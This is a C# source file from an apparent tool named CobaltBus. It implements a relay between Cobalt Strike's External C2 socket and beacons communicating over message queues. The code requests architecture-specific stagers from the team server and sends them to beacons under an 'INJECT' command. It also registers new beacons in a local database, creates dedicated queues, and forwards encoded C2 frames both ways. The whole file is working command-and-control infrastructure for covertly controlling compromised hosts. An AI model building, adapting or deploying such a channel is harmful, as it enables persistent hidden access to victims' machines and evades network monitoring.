using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using CobaltBus.Models;
using System.Threading;
using System.Linq;
using Newtonsoft.Json;

namespace CobaltBus.Handlers
{
    public class CobaltHandler
    {

        private const int MaxBufferSize = 1024 * 1024;
        private readonly IPEndPoint _endpoint;

        public LiteDbHandler LiteDbHandler { get; set; }
        public CobaltHandler(string ipAddr, string port, LiteDbHandler liteDbHandler, string beaconId)
        {
            var server = BitConverter.ToUInt32(
                IPAddress.Parse(ipAddr).GetAddressBytes(), 0);
            _endpoint = new IPEndPoint(server, Convert.ToInt32(port));

            LiteDbHandler = liteDbHandler;
            BeaconId = beaconId;
        }

        public byte[] StagerByteArray { get; set; }
        public Socket Socket { get; private set; }
        public string BeaconId { get; set; }

        public bool StagerBusy { get; set; }
        public bool Connected => Socket?.Connected ?? false;


        public bool Connect()
        {
            Socket = new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            Socket.Connect(_endpoint);

            if (!Socket.Connected) return false;

            // Configure other socket options if needed
            Socket.ReceiveTimeout = 10000;

            return Socket.Connected;
        }



        public void Close()
        {
            Socket.Close();
        }


        public void Dispose()
        {
            Socket.Close();
        }

        public byte[] ReadFrame()
        {
            try
            {
                var sizeBytes = new byte[4];
                Socket.Receive(sizeBytes);
                var size = BitConverter.ToInt32(sizeBytes, 0) > MaxBufferSize
                    ? MaxBufferSize
                    : BitConverter.ToInt32(sizeBytes, 0);

                var total = 0;
                var bytesReceived = new byte[size];
                while (total < size)
                {
                    var bytes = Socket.Receive(bytesReceived, total, size - total, SocketFlags.None);
                    total += bytes;
                }
                if (size > 1 && size < 1024)
                    Console.WriteLine($"[+] Read frame: {Convert.ToBase64String(bytesReceived)}");

                return bytesReceived;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception while reading socket: {ex.Message}");
                return new byte[] { 0x00 };
            }
        }

        public BeaconMsg ProcessMessage(BeaconMsg beaconMsg)
        {
            //Draft a response msg
            BeaconMsg responseMsg = new BeaconMsg()
            {
                From = beaconMsg.To,
                To = beaconMsg.From,
                Queue = beaconMsg.Queue

            };

            if (!string.IsNullOrEmpty(beaconMsg.Command))
            {


                // Console.WriteLine(JsonConvert.SerializeObject(beaconMsg, Formatting.Indented));
                //This hold the C2 communcation protocol logic

                //Check if this beaconId is already in the database
                string beaconId = beaconMsg.From;

                if (LiteDbHandler.QueryBeacons().Exists(x => x.BeaconId.Equals(beaconId)))
                {

                    var beacon = LiteDbHandler.QueryBeacons().Where(x => x.BeaconId.Equals(beaconId)).FirstOrDefault();
                    //If the beaconId is in the database, forward traffic normally
                    var msgPayload = beaconMsg.Payload;

                    Console.WriteLine($"[+] Writing to Cobalt => {msgPayload.Substring(0, (msgPayload.Length > 100) ? 100 : msgPayload.Length)}");


                    var buffer = Convert.FromBase64String(msgPayload);


                    SendFrame(buffer);


                    var readBuffer = ReadFrame();
                    if (readBuffer.Length > 0)
                    {
                        //Send that data down to the client
                        responseMsg.Command = "COM";
                        responseMsg.Payload = Convert.ToBase64String(readBuffer);

                    }
                    beacon.Active = true;
                    LiteDbHandler.UpdateBeacon(beacon);
                }
                else if (beaconMsg.Command.Equals("GETSTAGER"))
                {

                    Console.WriteLine("[+] Got stager request from beacon " + beaconId);

                    //If the beaconId is NOT in the database, we need to give it a stager, as set the ID
                    var pipeName = beaconMsg.Payload.Split(":")[0];
                    var is64Bit = beaconMsg.Payload.Split(":")[1];

                    Console.WriteLine("[+] Stager pipename " + pipeName);

                    if (StagerByteArray == null)
                        StagerByteArray = GetStager(pipeName, (is64Bit.Equals("1") ? true : false));


                    Console.WriteLine($"[+] Got stager of size {StagerByteArray.Length}");

                    responseMsg.Command = "INJECT";
                    responseMsg.Payload = Convert.ToBase64String(StagerByteArray);

                    LiteDbHandler.WriteBeacon(new Beacon() { BeaconId = beaconId, Queue = beaconMsg.Queue });
                }
                else if (beaconMsg.Command.Equals("INITIALIZE"))
                {
                    //We want to create a new servicebus queue to repond on
                    Console.WriteLine("[+] Got initialize request from beacon " + beaconId);

                    var newQueName = Guid.NewGuid().ToString().Replace("-", "").ToLower();

                    Console.WriteLine("[+] Generated a dedicated servicebus Queue " + newQueName);

                    responseMsg.Command = "CHANNEL";
                    responseMsg.Payload = newQueName;
                }



            }

            return responseMsg;
        }

        public void SendFrame(byte[] buffer, bool bypass = false)
        {
            //Wait until the stager is done
            if (!bypass)
                while (StagerBusy)
                {

                }

            if (buffer.Length > 2 && buffer.Length < 1024)
                Console.WriteLine($"[+] Sending frame: {Convert.ToBase64String(buffer)}");

            var lenBytes = BitConverter.GetBytes(buffer.Length);
            Socket.Send(lenBytes, 4, 0);
            Socket.Send(buffer);
        }


        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            StagerBusy = true;
            Console.WriteLine("[+] Getting stager from Cobalt");
            SendFrame(Encoding.ASCII.GetBytes(is64Bit ? "arch=x64" : "arch=x86"), true);
            SendFrame(Encoding.ASCII.GetBytes("pipename=" + pipeName), true);
            SendFrame(Encoding.ASCII.GetBytes("block=" + taskWaitTime), true);
            SendFrame(Encoding.ASCII.GetBytes("go"), true);
            StagerBusy = false;
            return ReadFrame();
        }

    }
}
